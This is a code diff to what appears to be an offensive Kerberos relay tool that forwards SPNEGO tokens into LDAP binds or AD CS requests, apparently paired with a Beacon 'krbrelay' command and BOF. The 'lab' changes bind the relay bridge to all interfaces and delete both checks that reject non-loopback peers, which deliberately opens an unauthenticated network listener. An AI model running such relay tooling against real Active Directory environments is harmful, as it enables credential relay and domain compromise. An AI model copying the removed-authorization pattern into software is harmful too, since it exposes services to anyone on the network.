@@ -1255,6 +1255,7 @@ def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
             leg += 1
             if leg == 1:
                 source_direct_kerberos = token.startswith(b"\x6e")
+                print(f"[*] leg1 token[0]={token[:1].hex()} direct_kerberos={source_direct_kerberos}", flush=True)
             log(f"Received opaque SPNEGO leg {leg}; sending an LDAP SASL GSS-SPNEGO BindRequest")
             pipelined_ids = []
             pipeline_bundle = None
@@ -1544,9 +1545,10 @@ def main(argv: list[str]) -> int:
         ports = [options.port, options.ldap_port]
     if any(not 1 <= value <= 65535 for value in ports):
         raise SystemExit("TCP ports must be between 1 and 65535")
-    # KRB1 is reachable only through the target's rportfwd_local transport.
-    # Binding and authorizing loopback internally prevents network exposure.
-    bridge_address = "127.0.0.1"
+    # Lab change: bind on all interfaces so the standalone exe can reach the
+    # relay directly over the network. Upstream binds loopback only for the
+    # BOF rportfwd_local transport.
+    bridge_address = "0.0.0.0"
     service_spn = f"http/{options.adcs_host}" if options.mode == "adcs" else f"ldap/{options.ldap_host}"
     print(
         f"[*] Matching Beacon command: krbrelay {options.port} "
@@ -1562,9 +1564,8 @@ def main(argv: list[str]) -> int:
         probe, peer = listener.accept()
         with probe:
             channel = RecordChannel(probe)
-            if peer[0] != bridge_address:
-                print("[-] Rejected unauthorized bridge peer", flush=True)
-                return 1
+            # Lab change: upstream rejects any non-loopback peer here.
+            print(f"[*] Bridge preflight peer {peer[0]}", flush=True)
             try:
                 # Keep preflight separate from the token stream. The BOF
                 # closes this socket and opens a fresh one during SSPI.
@@ -1579,9 +1580,8 @@ def main(argv: list[str]) -> int:
         client, peer = listener.accept()
         with client:
             channel = RecordChannel(client)
-            if peer[0] != bridge_address:
-                print("[-] Rejected unauthorized bridge peer", flush=True)
-                return 1
+            # Lab change: upstream rejects any non-loopback peer here.
+            print(f"[*] Bridge token peer {peer[0]}", flush=True)
             if options.verbose:
                 print(f"[+] Accepted authorized bridge connection from {peer[0]}", flush=True)
             try:
